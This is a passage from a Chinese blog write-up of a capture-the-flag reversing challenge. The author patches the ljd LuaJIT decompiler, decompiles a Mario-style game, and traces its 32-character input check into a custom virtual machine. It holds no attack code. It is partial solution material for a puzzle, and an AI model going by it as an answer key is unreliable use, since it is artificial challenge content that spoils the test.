&#123;A_minus_one&#125;;&quot;</span></span><br><span class="line">		<span class="string">&quot; &#123;from_A_x_B_minus_two&#125; =&quot;</span></span><br><span class="line">			<span class="string">&quot; &#123;A_minus_three&#125;(&#123;A_minus_two&#125;, &#123;A_minus_one&#125;)&quot;</span>)</span><br><span class="line"></span><br><span class="line">VARG = _IDef(<span class="string">&quot;VARG&quot;</span>, 		T_BS, 	T_LIT, 	T_LIT,</span><br><span class="line">		<span class="string">&quot;&#123;from_A_x_B_minus_two&#125; = ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">ISNEXT = _IDef(<span class="string">&quot;ISNEXT&quot;</span>, 	 T_BS, 	None, 	T_JMP,</span><br><span class="line">		<span class="string">&quot;Verify ITERN at &#123;D&#125;; goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"># Loops <span class="keyword">and</span> branches. I/J = interp/JIT, I/C/L = init/call/loop.</span><br><span class="line"></span><br><span class="line">FORI = _IDef(<span class="string">&quot;FORI&quot;</span>, 		T_BS, 	None, 	T_JMP,</span><br><span class="line">		<span class="string">&quot;for &#123;A_plus_three&#125; = &#123;A&#125;,&#123;A_plus_one&#125;,&#123;A_plus_two&#125;&quot;</span></span><br><span class="line">		<span class="string">&quot; else goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">JFORI = _IDef(<span class="string">&quot;JFORI&quot;</span>, 		T_BS, 	None, 	T_JMP,</span><br><span class="line">		<span class="string">&quot;for &#123;A_plus_three&#125; = &#123;A&#125;,&#123;A_plus_one&#125;,&#123;A_plus_two&#125;&quot;</span></span><br><span class="line">		<span class="string">&quot; else goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">FORL = _IDef(<span class="string">&quot;FORL&quot;</span>, 		T_BS, 	None, 	T_JMP,</span><br><span class="line">		<span class="string">&quot;&#123;A&#125; = &#123;A&#125; + &#123;A_plus_two&#125;;&quot;</span></span><br><span class="line">		<span class="string">&quot; if cmp(&#123;A&#125;, sign &#123;A_plus_two&#125;,  &#123;A_plus_one&#125;) goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">IFORL = _IDef(<span class="string">&quot;IFORL&quot;</span>, 	 	T_BS, 	None, 	T_JMP,</span><br><span class="line">		<span class="string">&quot;&#123;A&#125; = &#123;A&#125; + &#123;A_plus_two&#125;;&quot;</span></span><br><span class="line">		<span class="string">&quot; if cmp(&#123;A&#125;, sign &#123;A_plus_two&#125;, &#123;A_plus_one&#125;) goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">JFORL = _IDef(<span class="string">&quot;JFORL&quot;</span>, 		T_BS, 	None, 	T_JMP,</span><br><span class="line">		<span class="string">&quot;&#123;A&#125; = &#123;A&#125; + &#123;A_plus_two&#125;;&quot;</span></span><br><span class="line">		<span class="string">&quot; if cmp(&#123;A&#125;, sign &#123;A_plus_two&#125;, &#123;A_plus_one&#125;) goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ITERL = _IDef(<span class="string">&quot;ITERL&quot;</span>, 		T_BS, 	None, 	T_JMP,</span><br><span class="line">		<span class="string">&quot;&#123;A_minus_one&#125; = &#123;A&#125;; if &#123;A&#125; != nil goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">IITERL = _IDef(<span class="string">&quot;IITERL&quot;</span>, 	T_BS, 	None, 	T_JMP,</span><br><span class="line">		<span class="string">&quot;&#123;A_minus_one&#125; = &#123;A&#125;; if &#123;A&#125; != nil goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">JITERL = _IDef(<span class="string">&quot;JITERL&quot;</span>, 	T_BS, 	None, 	T_LIT,</span><br><span class="line">		<span class="string">&quot;&#123;A_minus_one&#125; = &#123;A&#125;; if &#123;A&#125; != nil goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">LOOP = _IDef(<span class="string">&quot;LOOP&quot;</span>, 		T_RBS, 	None, 	T_JMP, 	<span class="string">&quot;Noop&quot;</span>)</span><br><span class="line">ILOOP = _IDef(<span class="string">&quot;ILOOP&quot;</span>, 		T_RBS, 	None, 	T_JMP, 	<span class="string">&quot;Noop&quot;</span>)</span><br><span class="line">JLOOP = _IDef(<span class="string">&quot;JLOOP&quot;</span>, 		T_RBS, 	None, 	T_LIT, 	<span class="string">&quot;Noop&quot;</span>)</span><br><span class="line"></span><br><span class="line">JMP = _IDef(<span class="string">&quot;JMP&quot;</span>, 		T_RBS, 	None, 	T_JMP, 	<span class="string">&quot;	goto &#123;D&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"># Function headers. I/J = interp/JIT, F/V/C = fixarg/vararg/C func.</span><br><span class="line"># Shouldn<span class="string">&#x27;t be ever seen - they are not stored in raw dump?</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">FUNCF = _IDef(&quot;FUNCF&quot;, 		T_RBS, 	None, 	None,</span></span><br><span class="line"><span class="string">		&quot;Fixed-arg function with frame size &#123;A&#125;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">IFUNCF = _IDef(&quot;IFUNCF&quot;, 	T_RBS, 	None, 	None,</span></span><br><span class="line"><span class="string">		&quot;Interpreted fixed-arg function with frame size &#123;A&#125;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">JFUNCF = _IDef(&quot;JFUNCF&quot;, 	T_RBS, 	None, 	T_LIT,</span></span><br><span class="line"><span class="string">		&quot;JIT compiled fixed-arg function with frame size &#123;A&#125;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">FUNCV = _IDef(&quot;FUNCV&quot;, 		T_RBS, 	None, 	None,</span></span><br><span class="line"><span class="string">		&quot;Var-arg function with frame size &#123;A&#125;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">IFUNCV = _IDef(&quot;IFUNCV&quot;, 	T_RBS, 	None, 	None,</span></span><br><span class="line"><span class="string">		&quot;Interpreted var-arg function with frame size &#123;A&#125;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">JFUNCV = _IDef(&quot;JFUNCV&quot;, 	T_RBS, 	None, 	T_LIT,</span></span><br><span class="line"><span class="string">		&quot;JIT compiled var-arg function with frame size &#123;A&#125;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">FUNCC = _IDef(&quot;FUNCC&quot;, 		T_RBS, 	None, 	None,</span></span><br><span class="line"><span class="string">		&quot;C function with frame size &#123;A&#125;&quot;)</span></span><br><span class="line"><span class="string">FUNCCW = _IDef(&quot;FUNCCW&quot;, 	T_RBS, 	None, 	None,</span></span><br><span class="line"><span class="string">		&quot;Wrapped C function with frame size &#123;A&#125;&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">UNKNW = _IDef(&quot;UNKNW&quot;, 		T_LIT, 	T_LIT, 	T_LIT, &quot;Unknown instruction&quot;)</span></span><br></pre></td></tr></table></figure>

<p>3、修改ljd&#x2F;ast&#x2F;builder.py</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">diff -urNa ljd-old/ast/builder.py ljd-new/ast/builder.py</span><br><span class="line"><span class="comment">--- ljd-old/ast/builder.py	2020-05-09 03:43:27.000000000 -0700</span></span><br><span class="line">+++ ljd-new/ast/builder.py	<span class="number">2022</span><span class="number">-09</span><span class="number">-20</span> <span class="number">02</span>:<span class="number">04</span>:<span class="number">53.955771000</span> <span class="number">-0700</span></span><br><span class="line">@@ <span class="number">-276</span>,<span class="number">7</span> +<span class="number">276</span>,<span class="number">7</span> @@</span><br><span class="line">     last = instructions[<span class="number">-1</span>]</span><br><span class="line">     opcode = <span class="number">256</span> <span class="keyword">if</span> <span class="built_in">len</span>(instructions) == <span class="number">1</span> <span class="keyword">else</span> instructions[<span class="number">-2</span>].opcode</span><br><span class="line"> </span><br><span class="line">-    <span class="keyword">if</span> opcode &lt;= ins.ISF.opcode:</span><br><span class="line">+    <span class="keyword">if</span> opcode <span class="keyword">in</span> (ins.ISLT.opcode, ins.ISGE.opcode, ins.ISLE.opcode, ins.ISGT.opcode, ins.ISEQV.opcode, ins.ISNEV.opcode, ins.ISEQS.opcode, ins.ISNES.opcode, ins.ISEQN.opcode, ins.ISNEN.opcode, ins.ISEQP.opcode, ins.ISNEP.opcode, ins.ISTC.opcode, ins.ISFC.opcode, ins.IST.opcode, ins.ISF.opcode):</span><br><span class="line">         <span class="built_in">assert</span> last.opcode != ins.ISNEXT.opcode</span><br><span class="line">         <span class="keyword">return</span> _build_conditional_warp(state, last_addr, instructions)</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">@@ <span class="number">-507</span>,<span class="number">7</span> +<span class="number">507</span>,<span class="number">7</span> @@</span><br><span class="line">         expression = _build_unary_expression(state, addr, instruction)</span><br><span class="line"> </span><br><span class="line">     # Binary assignment operators (A = B op C)</span><br><span class="line">-    elif opcode &lt;= ins.POW.opcode:</span><br><span class="line">+    elif ins.ADDVN.opcode &lt;= opcode &lt;= ins.POW.opcode:</span><br><span class="line">         expression = _build_binary_expression(state, addr, instruction)</span><br><span class="line"> </span><br><span class="line">     # Concat assignment <span class="built_in">type</span> (A = B .. B + <span class="number">1</span> .. ... .. C - <span class="number">1</span> .. C)</span><br><span class="line">@@ <span class="number">-515</span>,<span class="number">7</span> +<span class="number">515</span>,<span class="number">7</span> @@</span><br><span class="line">         expression = _build_concat_expression(state, addr, instruction)</span><br><span class="line"> </span><br><span class="line">     # Constant assignment operators except KNIL, which is weird anyway</span><br><span class="line">-    elif opcode &lt;= ins.KPRI.opcode:</span><br><span class="line">+    elif ins.KSTR.opcode &lt;= opcode &lt;= ins.KPRI.opcode:</span><br><span class="line">         expression = _build_const_expression(state, addr, instruction)</span><br><span class="line"> </span><br><span class="line">     elif opcode == ins.UGET.opcode:</span><br><span class="line">@@ <span class="number">-524</span>,<span class="number">7</span> +<span class="number">524</span>,<span class="number">7</span> @@</span><br><span class="line">     elif opcode == ins.USETV.opcode:</span><br><span class="line">         expression = _build_slot(state, addr, instruction.CD)</span><br><span class="line"> </span><br><span class="line">-    elif opcode &lt;= ins.USETP.opcode:</span><br><span class="line">+    elif ins.USETS.opcode &lt;= opcode &lt;= ins.USETP.opcode:</span><br><span class="line">         expression = _build_const_expression(state, addr, instruction)</span><br><span class="line"> </span><br><span class="line">     elif opcode == ins.FNEW.opcode:</span><br><span class="line">            </span><br></pre></td></tr></table></figure>

<p>然后在luajit-decompiler-master根目录运行<code>python main.py -f &lt;script_name&gt;.luac64 &gt; &lt;script_name&gt;.lua</code> 可以得到单个文件的反编译结果</p>
<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230411213234681.png" alt="image-20230411213234681"></p>
<p>最后就可以看到lua代码，而不是汇编（这点还是很友善地）</p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>在GameScene.lua中有判断胜利的条件：</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (slot0.mario.face == MarioState.RIGHT <span class="keyword">or</span> slot3 == MarioState.JUMP_RIGHT) <span class="keyword">and</span> slot0.mainMap.enemyList[<span class="number">1</span>] <span class="keyword">and</span> slot4.position.x &lt;= slot2.x + slot0.marioSize.width <span class="keyword">and</span> slot2.y &lt;= slot4.position.y + <span class="number">10</span> <span class="keyword">then</span></span><br><span class="line">		<span class="keyword">if</span> slot0.mario.bodyType == MarioBodyState.NORMAL <span class="keyword">then</span></span><br><span class="line">			slot0.win = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">			slot0.mainMap:onWin()</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			slot0:doMarioDie()</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		<span class="keyword">end</span></span><br><span class="line">	<span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>首先是要求马里奥的bodyType大小是normal，正常初始是small，发现在<em>collisionV</em> 函数中</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> slot6 = <span class="number">6</span>, slot0.marioSize.width - <span class="number">7</span> <span class="keyword">do</span></span><br><span class="line">		<span class="keyword">if</span> slot0.mainMap:isMarioEatMushroom(slot0.mainMap:pointToTileCoord(cc.p(slot1.x - slot0.marioSize.width / <span class="number">2</span> + slot6, slot1.y + slot0.marioSize.height))) <span class="keyword">then</span></span><br><span class="line">			slot0.mario:changeForGotMushroom()</span><br><span class="line">			cc.SimpleAudioEngine:getInstance():playEffect(music_eatmushroomOrFlower)</span><br><span class="line">		<span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>存在changeForGotMushroom()，猜测是吃蘑菇变大，在GameMap.lua中有isMarioEatMushroom来判断是否吃蘑菇，在这个函数上方有showNewMushroom函数，是显示蘑菇，这个就比较重要了</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">slot0.showNewMushroom</span><span class="params">(slot0, slot1, slot2)</span></span></span><br><span class="line">	cc.SimpleAudioEngine:getInstance():playEffect(music_dingchumoguhuohua)</span><br><span class="line"></span><br><span class="line">	slot0.mushTileCoord = cc.p(slot1.x, slot1.y - <span class="number">1</span>)</span><br><span class="line">	slot3 = cc.pAdd(slot0:tileCoordToPoint(slot0.mushTileCoord), cc.p(slot0.tileSize.width / <span class="number">2</span>, slot0.tileSize.height / <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> slot2 == MarioBodyState.SMALL <span class="keyword">then</span></span><br><span class="line">		slot0.mushSprite = cc.Sprite:<span class="built_in">create</span>(pic_rewardMushroom, cc.rect(<span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">16</span>))</span><br><span class="line">	<span class="keyword">elseif</span> MarioBodyState.NORMAL == slot2 <span class="keyword">then</span></span><br><span class="line">		slot0.mushSprite = cc.Sprite:<span class="built_in">create</span>(pic_toolMushroom, cc.rect(<span class="number">0</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">18</span>))</span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">	slot3.y = slot3.y - slot0.tileSize.height</span><br><span class="line"></span><br><span class="line">	slot0.mushSprite:setPosition(slot3)</span><br><span class="line">	slot0:addChild(slot0.mushSprite)</span><br><span class="line">	slot0.mushSprite:runAction(cc.MoveBy:<span class="built_in">create</span>(<span class="number">0.5</span>, cc.p(<span class="number">0</span>, slot0.tileSize.height)))</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>这个函数是在breakBrick函数调用</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">slot0.breakBrick</span><span class="params">(slot0, slot1, slot2)</span></span></span><br><span class="line">	<span class="keyword">if</span> slot0:getPropertiesForGID(slot0.brickLayer:getTileGIDAt(slot1)) == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">		slot0:chageBlockState(slot1)</span><br><span class="line">	<span class="keyword">elseif</span> slot4 == <span class="number">601</span> <span class="keyword">and</span> slot0:itemInList(slot0.mushroomCoordList, slot1) <span class="keyword">then</span></span><br><span class="line">		<span class="keyword">for</span> slot9 = <span class="number">0</span>, <span class="number">31</span> <span class="keyword">do</span></span><br><span class="line">			slot5 = <span class="string">&quot;&quot;</span> .. slot0.labelList[<span class="string">&quot;input&quot;</span> .. <span class="built_in">tostring</span>(slot9)]:getString()</span><br><span class="line">		<span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">		slot6 = <span class="built_in">require</span>(<span class="string">&quot;core.Util&quot;</span>).<span class="built_in">create</span>(slot5)</span><br><span class="line"></span><br><span class="line">		slot6:OoO()</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> slot6:oOo() <span class="keyword">then</span></span><br><span class="line">			slot0:showNewMushroom(slot1, slot2)</span><br><span class="line">			slot0:removeItem(slot0.mushroomCoordList, slot1)</span><br><span class="line">		<span class="keyword">end</span></span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>这个东西是最重要的：</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> slot9 = <span class="number">0</span>, <span class="number">31</span> <span class="keyword">do</span></span><br><span class="line">	slot5 = <span class="string">&quot;&quot;</span> .. slot0.labelList[<span class="string">&quot;input&quot;</span> .. <span class="built_in">tostring</span>(slot9)]:getString()</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>也就是通过顶砖块，进行32个字符的输入，输入正确就能得到蘑菇，击败板栗就能成功。之后将输入的拼接成slot5传递给util.lua文件的create函数，返回slot6，这个值再调用OoO(),然后调用slot6:oOo()，返回1就行，所以如何使slot6:oOo()函数返回true。</p>
<p>看util.lua函数会发现，出题人实现了一个虚拟机</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">slot0.OoO</span><span class="params">(slot0)</span></span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span></span><br><span class="line">		opcode = slot0.slot[<span class="number">1</span>][slot0.slot[<span class="number">5</span>]]</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> opcode == <span class="number">17</span> <span class="keyword">then</span></span><br><span class="line">			slot1 = slot0.slot[<span class="number">1</span>][slot0.slot[<span class="number">5</span>] + <span class="number">1</span>]</span><br><span class="line">			slot0.slot[<span class="number">1</span>][<span class="number">33</span> + slot1] = slot0:lil(slot0.slot[<span class="number">1</span>][<span class="number">33</span> + slot1] + <span class="number">1</span>, <span class="number">255</span>)</span><br><span class="line">			slot0.slot[<span class="number">5</span>] = slot0.slot[<span class="number">5</span>] + <span class="number">2</span></span><br><span class="line">		<span class="keyword">elseif</span> opcode == <span class="number">33</span> <span class="keyword">then</span></span><br><span class="line">			slot1 = slot0.slot[<span class="number">1</span>][slot0.slot[<span class="number">5</span>] + <span class="number">1</span>]</span><br><span class="line">			slot0.slot[slot1 - <span class="number">7</span>] = slot0:lil(slot0.slot[slot1 - <span class="number">7</span>] + <span class="number">1</span>, <span class="number">255</span>)</span><br><span class="line">			slot0.slot[<span class="number">5</span>] = slot0.slot[<span class="number">5</span>] + <span class="number">2</span></span><br><span class="line">		<span class="keyword">elseif</span> opcode == <span class="number">65</span> <span class="keyword">then</span></span><br><span class="line">			slot0.slot[<span class="number">6</span>] = slot0.slot[<span class="number">6</span>] + <span class="number">1</span></span><br><span class="line">			slot0.slot[<span class="number">2</span>][slot0.slot[<span class="number">6</span>]] = slot0.slot[<span class="number">1</span>][slot0.slot[<span class="number">5</span>] + <span class="number">1</span>]</span><br><span class="line">			slot0.slot[<span class="number">5</span>] = slot0.slot[<span class="number">5</span>] + <span class="number">2</span></span><br><span class="line">		<span class="keyword">elseif</span> opcode == <span class="number">18</span> <span class="keyword">then</span></span><br><span class="line">			slot1 = slot0.slot[<span class="number">1</span>][slot0.slot[<span class="number">5</span>] + <span class="number">1</span>]</span><br><span class="line">			slot0.slot[<span class="number">1</span>][<span class="number">33</span> + slot1] = slot0:lil(slot0.slot[<span class="number">1</span>][<span class="number">33</span> + slot1] - <span class="number">1</span>, <span class="number">255</span>)</span><br><span class="line">			slot0.slot[<span class="number">5</span>] = slot0.slot[<span class="number">5</span>] + <span class="number">2</span></span><br><span class="line">		<span class="keyword">elseif</span> opcode == <span class="number">35</span> <span class="keyword">then</span></span><br><span class="line">			slot1 = slot0.slot[<span class="number">1</span>][slot0.slot[<span class="number">5</span>] + <span class="number">1</span>]</span><br><span class="line">			slot0.slot[slot1 - <span class="number">7</span>] = slot0:ili(slot0.slot[slot1 - <span class="number">7</span>], slot0.slot[<span class="number">1</span>][slot0.slot[<span class="number">5</span>] + <span class="number">2</span>])</span><br><span class="line">			slot0.slot[<span class="number">5</span>] = slot0.slot[<span class="number">5</span>] + <span class="number">3</span></span><br><span class="line">		<span class="keyword">elseif</span> opcode == <span class="number">50</span> <span class="keyword">then</span></span><br><span class="line">			slot0.slot[<span class="number">6</span>] = slot0.slot[<span class="number">6</span>] + <span class="number">1</span></span><br><span class="line">			slot0.slot[<span class="number">2</span>][slot0.slot[<span class="number">6</span>]] = slot0.slot[<span class="number">2</span>][<span class="number">33</span> + slot0.slot[<span class="number">1</span>][slot0.slot[<span class="number">5</span>] + <span class="number">1</span>]]</span><br><span class="line">			slot0.slot[<span class="number">5</span>] = slot0.slot[<span class="number">5</span>] + <span class="number">2</span></span><br><span class="line">		<span class="keyword">elseif</span> opcode == <span class="number">36</span> <span class="keyword">then</span></span><br><span class="line">			slot1 = slot0.slot[<span class="number">1</span>][slot0.slot[<span class="number">5</span>] + <span class="number">1</span>]</span><br><span class="line">			slot0.slot[slot1 - <span class="number">7</span>] = slot0:ili(slot0.slot[slot1 - <span class="number">7</span>], slot0.slot[slot0.slot[<span class="number">1</span>][slot0.slot[<span class="number">5</span>] + <span class="number">2</span>] - <span class="number">7</span>])</span><br><span class="line">			slot0.slot[<span class="number">5</span>] = slot0.slot[<span class="number">5</span>] + <span class="number">3</span></span><br><span class="line">		<span class="keyword">elseif</span> opcode == <span class="number">49</span> <span class="keyword">then</span></span><br><span class="line">			slot0.slot[<span class="number">2</span>][<span class="number">224</span> + slot0.slot[<span class="number">1</span>][slot0.slot[<span class="number">5</span>] + <span class="number">1</span>]] = slot0.slot[<span class="number">2</span>][slot0.slot[<span class="number">6</span>]]</span><br><span class="line">			slot0.slot[<span class="number">6</span>] = slot0.slot[<span class="number">6</span>] - <span class="number">1</span></span><br><span class="line">			slot0.slot[<span class="number">5</span>] = slot0.slot[<span class="number">5</span>] + <span class="number">2</span></span><br><span class="line">		<span class="keyword">elseif</span> opcode == <span class="number">34</span> <span class="keyword">then</span></span><br><span class="line">			slot1 = slot0.slot[<span class="number">1</span>][slot0.slot[<span class="number">5</span>] + <span class="number">1</span>]</span><br><span class="line">			slot0.slot[slot1 - <span class="number">7</span>] = slot0:lil(slot0.slot[slot1 - <span class="number">7</span>] - <span class="number">1</span>, <span class="number">255</span>)</span><br><span class="line">			slot0.slot[<span class="number">5</span>] = slot0.slot[<span class="number">5</span>] + <span class="number">2</span></span><br><span class="line">		<span class="keyword">elseif</span> opcode == <span class="number">66</span> <span class="keyword">then</span></span><br><span class="line">			slot0.slot[<span class="number">6</span>] = slot0.slot[<span class="number">6</span>] + <span class="number">1</span></span><br><span class="line">			slot0.slot[<span class="number">2</span>][slot0.slot[<span class="number">6</span>]] = slot0.slot[slot0.slot[<span class="number">1</span>][slot0.slot[<span class="number">5</span>] + <span class="number">1</span>] - <span class="number">7</span>]</span><br><span class="line">			slot0.slot[<span class="number">5</span>] = slot0.slot[<span class="number">5</span>] + <span class="number">2</span></span><br><span class="line">		<span class="keyword">elseif</span> opcode == <span class="number">37</span> <span class="keyword">then</span></span><br><span class="line">			slot0.slot[slot0.slot[<span class="number">1</span>][slot0.slot[<span class="number">5</span>] + <span class="number">1</span>] - <span class="number">7</span>] = slot0.slot[<span class="number">2</span>][slot0.slot[<span class="number">6</span>]]</span><br><span class="line">			slot0.slot[<span class="number">6</span>] = slot0.slot[<span class="number">6</span>] - <span class="number">1</span></span><br><span class="line">			slot0.slot[<span class="number">5</span>] = slot0.slot[<span class="number">5</span>] + <span class="number">2</span></span><br><span class="line">		<span class="keyword">elseif</span> opcode == <span class="number">144</span> <span class="keyword">then</span></span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">end</span></span><br><span class="line">	<span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>slot0.slot[5] + 1是计数的，slot0.slot[1]是数组，slot0:lil函数代表第一个操作数的运算，比如：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">slot0<span class="selector-class">.slot</span><span class="selector-attr">[1]</span><span class="selector-attr">[33 + slot1]</span> = slot0:<span class="built_in">lil</span>(slot0<span class="selector-class">.slot</span><span class="selector-attr">[1]</span><span class="selector-attr">[33 + slot1]</span> + <span class="number">1</span>, <span class="number">255</span>)</span><br><span class="line">也就是实现了slot0<span class="selector-class">.slot</span><span class="selector-attr">[1]</span><span class="selector-attr">[33 + slot1]</span> ++</span><br><span class="line">slot0<span class="selector-class">.slot</span><span class="selector-attr">[1]</span><span class="selector-attr">[33 + slot1]</span> = slot0:<span class="built_in">lil</span>(slot0<span class="selector-class">.slot</span><span class="selector-attr">[1]</span><span class="selector-attr">[33 + slot1]</span> - <span class="number">1</span>, <span class="number">255</span>)</span><br><span class="line">实现了slot0<span class="selector-class">.slot</span><span class="selector-attr">[1]</span><span class="selector-attr">[33 + slot1]</span> --</span><br><span class="line">slot0<span class="selector-class">.slot</span><span class="selector-attr">[slot1 - 7]</span> = slot0:<span class="built_in">ili</span>(slot0<span class="selector-class">.slot</span><span class="selector-attr">[slot1 - 7]</span>, slot0<span class="selector-class">.slot</span><span class="selector-attr">[1]</span><span class="selector-attr">[slot0.slot[5]</span> + <span class="number">2</span>])</span><br><span class="line">实现了异或</span><br></pre></td></tr></table></figure>

